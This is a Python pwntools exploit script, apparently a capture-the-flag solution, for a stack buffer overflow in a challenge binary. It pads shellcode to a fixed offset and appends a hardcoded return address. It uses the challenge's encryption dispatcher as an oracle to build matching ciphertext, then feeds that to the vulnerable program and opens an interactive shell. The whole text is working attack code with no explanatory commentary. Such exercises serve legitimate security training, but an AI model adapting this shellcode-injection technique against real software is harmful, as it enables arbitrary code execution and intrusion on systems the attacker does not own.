from pwn import *
import subprocess
import struct

context.binary = ELF("/challenge/vulnerable-overflow")

buffer_addr = 0x7fffffffe970	# address to jump to
offset = 96

with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

padding_len = offset - len(shellcode)

payload = shellcode + b"A" * padding_len

# Split payload into 16-byte blocks (AES block size)
blocks = [payload[i:i+16] for i in range(0, len(payload), 16)]

blocks.append(b"A"*8 + p64(buffer_addr))

ciphertext = b""
for i, block in enumerate(blocks):
    in_file = f"block_{i}.in"
    out_file = f"block_{i}.out"

    with open(in_file, "wb") as f:
        f.write(block)

    subprocess.run(f"/challenge/dispatch < {in_file} > {out_file}", shell=True)

    with open(out_file, "rb") as f:
        block_data = f.read()
        if i == 0:
            ciphertext += block_data[:32]
        else:
            ciphertext += block_data[16:32]


with open("cipher", "wb") as f:
    f.write(ciphertext)

# Send the crafted ciphertext to the vulnerable binary

p = process("/challenge/vulnerable-overflow")
print(f"PID is {p.pid}")
p.send(ciphertext)
p.interactive()
